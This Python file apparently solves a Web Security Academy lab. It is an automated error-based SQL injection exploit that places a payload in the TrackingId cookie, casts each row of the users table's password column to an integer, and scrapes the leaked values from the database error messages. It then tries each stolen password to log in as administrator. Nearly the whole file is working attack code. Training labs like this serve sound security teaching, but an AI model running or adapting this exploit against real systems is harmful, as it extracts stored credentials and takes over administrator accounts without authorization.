from web_security_academy.core.logger import logger
from bs4 import BeautifulSoup
import re


def solve_lab(session):
    logger.info(f'Extracting passwords by visiting "/" with the following cookies:')
    logger.info(
        '{"TrackingId": "\' OR (SELECT password FROM users LIMIT 1 OFFSET \033[1;93m?\033[00m)::int=1 --"}'
    )

    passwords = []
    regex = re.compile('ERROR: invalid input syntax for type integer: "(.*)"')
    while True:
        cookies = {
            "TrackingId": f"' OR (SELECT password FROM users LIMIT 1 OFFSET {len(passwords)})::int=1 --"
        }
        resp = session.get_path("/", cookies=cookies)

        soup = BeautifulSoup(resp.text, "lxml")
        match = soup.find(string=regex)

        if match is None:
            logger.info(f"{len(passwords)} => None")
            break
        else:
            password = re.match(regex, match).group(1)
            logger.info(f"{len(passwords)} => {password}")
            passwords.append(password)

    if len(passwords) == 0:
        logger.failure("Unable to extract any passwords")
        return
    else:
        logger.success(f"Successfully extracted {len(passwords)} passwords")

    csrf = session.get_csrf_token("/login")

    logger.info("Attempting to log in as administrator using extracted passwords...")
    for password in passwords:
        data = {"csrf": csrf, "username": "administrator", "password": password}
        resp = session.post_path("/login", data=data)

        soup = BeautifulSoup(resp.text, "lxml")
        invalid = soup.find(string="Invalid username or password.")

        if invalid:
            logger.info(f"{password} => {invalid}")
        else:
            logger.success(f"{password} => Success")
            break
    else:
        logger.failure("Failed to log in as administrator")
        return
